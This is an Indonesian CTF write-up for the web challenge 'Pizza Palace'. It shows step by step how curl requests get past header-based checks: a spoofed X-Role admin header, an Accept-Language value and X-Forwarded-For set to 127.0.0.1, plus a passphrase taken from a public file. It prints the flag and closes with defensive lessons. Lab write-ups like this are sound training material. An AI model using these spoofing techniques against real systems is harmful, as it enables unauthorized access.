---
title: "Write-up: Pizza Palace"
description: "Migrated from database"
year: 2026
category: "CTF"
techStack: "CTF, WebExploit, CLI"
githubUrl: "-"
demoUrl: "-"
coverUrl: "/uploads/cover_1768867846966_9751fd87459bc.png"
createdAt: "2026-01-20T00:09:27.398Z"
updatedAt: "2026-01-24T17:48:16.145Z"
---

# Write-up: Pizza Palace

# Write-up CTF: Pizza Palace

## Informasi Challenge

**Nama:** Pizza Palace  
**Kategori:** Web  
**Tingkat Kesulitan:** Easy  
**Poin:** 240  
**Author:** aria

**Deskripsi:**
> Ada resep rahasia di server Pizza Palace. Coba cari cara untuk mengaksesnya.

**Hint:**
> すべてのキーはHTTPヘッダーにあります  
> (Semua "kunci" ada di HTTP header)

**URL:** https://pizza-palace.aria.my.id/

---

## Tahap 1: Reconnaissance (Pengintaian Awal)

### Akses Halaman Utama

```bash
curl -i https://pizza-palace.aria.my.id/
```

Halaman utama menampilkan menu dengan 3 file yang bisa diakses:
- `recipe_viewer.php?recipe=welcome.txt` - Pesan selamat datang
- `recipe_viewer.php?recipe=access_levels.txt` - Info level akses
- `recipe_viewer.php?recipe=basic_recipe.txt` - Resep dasar

**Catatan Penting:**
Percobaan manipulasi header di halaman utama (`/`) tidak mengubah output. Ini berarti validasi bukan di halaman utama, melainkan di endpoint `recipe_viewer.php`.

---

## Tahap 2: Membaca Petunjuk Access Level

### Request ke access_levels.txt

```bash
curl -i 'https://pizza-palace.aria.my.id/recipe_viewer.php?recipe=access_levels.txt'
```

### Response Header Penting

```
x-hint: Try X-Role header with different roles
```

### Isi File

```
レシピアクセスレベル:
-------------------
1. 公開メニュー (誰でも閲覧可) - Menu publik (bisa dilihat siapa saja)
2. スタッフレシピ (従業員) - Resep staff (karyawan)
3. 特別レシピ (管理職) - Resep spesial (manajemen)
4. 秘密レシピ (管理者のみ) - Resep rahasia (hanya admin)

注意: 各レシピは異なる閲覧権限を必要とします。
一部のレシピは保護されており、特別なアクセスが必要です。
```

**Kesimpulan:** Butuh header `X-Role` untuk mengakses resep dengan level lebih tinggi.

---

## Tahap 3: Mencoba Akses Secret Recipe

### Request Awal (Tanpa Header)

```bash
curl -i 'https://pizza-palace.aria.my.id/recipe_viewer.php?recipe=secret_recipe.txt'
```

**Response:**
```
エラー: 特別な資格を持つシェフのみがこのレシピを閲覧できます
(Error: Hanya chef dengan kualifikasi khusus yang bisa melihat resep ini)
```

**Kesimpulan:** Endpoint ini memang memiliki gate-check untuk akses.

---

## Tahap 4: Bypass Check #1 - Role Check

### Request dengan X-Role: admin

```bash
curl -i -H "X-Role: admin" -H "X-Forwarded-For: 127.0.0.1" \
  'https://pizza-palace.aria.my.id/recipe_viewer.php?recipe=secret_recipe.txt'
```

**Response:**
```
エラー: レシピが読める言語に設定されていません
(Error: Resep tidak diset ke bahasa yang bisa dibaca)
```

**Kesimpulan:** Check role berhasil dilewati! Sekarang butuh setting bahasa yang benar.

---

## Tahap 5: Bypass Check #2 - Language Check

### Request dengan Accept-Language

```bash
curl -i \
  -H "X-Role: admin" \
  -H "Accept-Language: ja-JP" \
  -H "X-Forwarded-For: 127.0.0.1" \
  'https://pizza-palace.aria.my.id/recipe_viewer.php?recipe=secret_recipe.txt'
```

**Response:**
```
エラー: このレシピはキッチン内からのみ閲覧可能です
(Error: Resep ini hanya bisa dilihat dari dalam kitchen)
```

**Kesimpulan:** Check bahasa berhasil dilewati! Sekarang butuh akses dari "kitchen" (localhost).

---

## Tahap 6: Bypass Check #3 - Location Check

Header `X-Forwarded-For: 127.0.0.1` sudah digunakan di request sebelumnya untuk men-spoof IP menjadi localhost (127.0.0.1), seolah-olah request datang dari server internal.

**Response setelah semua 3 header:**
```
エラー: 正しいシェフの合言葉が必要です
(Error: Membutuhkan passphrase chef yang benar)
```

**Kesimpulan:** Ketiga check (role, bahasa, lokasi) sudah berhasil dilewati! Sekarang tinggal mencari passphrase yang benar.

---

## Tahap 7: Mencari Passphrase

### Membaca welcome.txt untuk Clue

```bash
curl -i 'https://pizza-palace.aria.my.id/recipe_viewer.php?recipe=welcome.txt'
```

**Header Penting:**
```
x-hint: use parameter key=<your_key>
```

**Kesimpulan:** Passphrase dikirim melalui parameter `key=` dalam URL.

### Membaca basic_recipe.txt untuk Clue Tambahan

```bash
curl -i 'https://pizza-palace.aria.my.id/recipe_viewer.php?recipe=basic_recipe.txt'
```

**Header Penting:**
```
x-hint: レシピの名前が鍵となります
(Nama resep adalah kunci)
```

**Isi File:**
```
基本レシピ：ピザパレス
-----------------------
材料：
- ピザ生地
- トマトソース
- モッツァレラチーズ
- バジル
- オリーブオイル
...
```

**Kesimpulan:** Judul resep adalah "**ピザパレス**" (Pizza Palace). Ini adalah kunci/passphrase yang dicari!

---

## Tahap 8: Exploit Final - Mendapatkan Flag

### Gabungan Semua Requirement

Kita perlu menggabungkan semua requirement:
1. ✅ Header `X-Role: admin` (role check)
2. ✅ Header `Accept-Language: ja-JP` (language check)
3. ✅ Header `X-Forwarded-For: 127.0.0.1` (location check)
4. ✅ Parameter `key=ピザパレス` (passphrase check)
5. ✅ Parameter `recipe=secret_recipe.txt` (file yang ingin diakses)

### Command Final

Gunakan `-G` dan `--data-urlencode` untuk handle karakter Jepang dengan aman:

```bash
curl -i -G \
  -H "X-Role: admin" \
  -H "Accept-Language: ja-JP" \
  -H "X-Forwarded-For: 127.0.0.1" \
  --data-urlencode "recipe=secret_recipe.txt" \
  --data-urlencode "key=ピザパレス" \
  https://pizza-palace.aria.my.id/recipe_viewer.php
```

### Response - Flag Ditemukan! 🎉

```
秘密のレシピ - ピザパレススペシャル
================================

おめでとうございます！最高のシェフのみがこのレシピにアクセスできます。

🎯 CTF Flag:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FGTE{S3cr3t_R3c1p3_M4st3r_Ch3f_2025}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

特別な材料：
- 最高級のモッツァレラ
- 完璧に発酵させた生地
- シークレットスパイスミックス
...
```

---

## Ringkasan Solusi

### Tahapan Bypass Security Check

| No | Check | Bypass Method | Error Message |
|----|-------|---------------|---------------|
| 1 | Role Check | `X-Role: admin` | ❌ "特別な資格を持つシェフのみ..." → ✅ Next check |
| 2 | Language Check | `Accept-Language: ja-JP` | ❌ "レシピが読める言語に..." → ✅ Next check |
| 3 | Location Check | `X-Forwarded-For: 127.0.0.1` | ❌ "キッチン内からのみ..." → ✅ Next check |
| 4 | Passphrase Check | `key=ピザパレス` | ❌ "正しいシェフの合言葉..." → ✅ **FLAG!** |

### Flow Diagram

```
Start
  ↓
Access secret_recipe.txt (❌ Error: Need special chef)
  ↓
Add X-Role: admin (✅ Role OK → ❌ Error: Need language)
  ↓
Add Accept-Language: ja-JP (✅ Language OK → ❌ Error: Need kitchen access)
  ↓
Add X-Forwarded-For: 127.0.0.1 (✅ Location OK → ❌ Error: Need passphrase)
  ↓
Read welcome.txt → Clue: use parameter key=
  ↓
Read basic_recipe.txt → Clue: Recipe name is the key = "ピザパレス"
  ↓
Add key=ピザパレス (✅ All checks passed!)
  ↓
🎉 FLAG: FGTE{S3cr3t_R3c1p3_M4st3r_Ch3f_2025}
```

---

## Analisis Security

### Vulnerability yang Ditemukan

1. **Header-based Access Control** - Mudah di-bypass dengan manipulasi HTTP headers
2. **IP Spoofing via X-Forwarded-For** - Server mempercayai header yang bisa di-forge
3. **Weak Passphrase Mechanism** - Passphrase disimpan di file yang bisa diakses publik
4. **Security through Obscurity** - Mengandalkan penyembunyian info daripada enkripsi proper

### Pembelajaran

- ✅ Jangan pernah percaya HTTP headers untuk autentikasi
- ✅ Gunakan session-based atau token-based authentication yang proper
- ✅ Validasi IP dari server-side, bukan dari headers yang bisa di-manipulasi
- ✅ Jangan simpan credentials/secrets di file yang accessible

---

## Command Lengkap (One-liner)

```bash
curl -i -G -H "X-Role: admin" -H "Accept-Language: ja-JP" -H "X-Forwarded-For: 127.0.0.1" --data-urlencode "recipe=secret_recipe.txt" --data-urlencode "key=ピザパレス" https://pizza-palace.aria.my.id/recipe_viewer.php
```

---

## Flag

```
FGTE{S3cr3t_R3c1p3_M4st3r_Ch3f_2025}
```

---

**Selesai! 🍕**

Challenge ini mengajarkan tentang:
- HTTP header manipulation
- Multiple security bypass techniques
- Information gathering dari hints tersembunyi
- Importance of proper authentication mechanisms
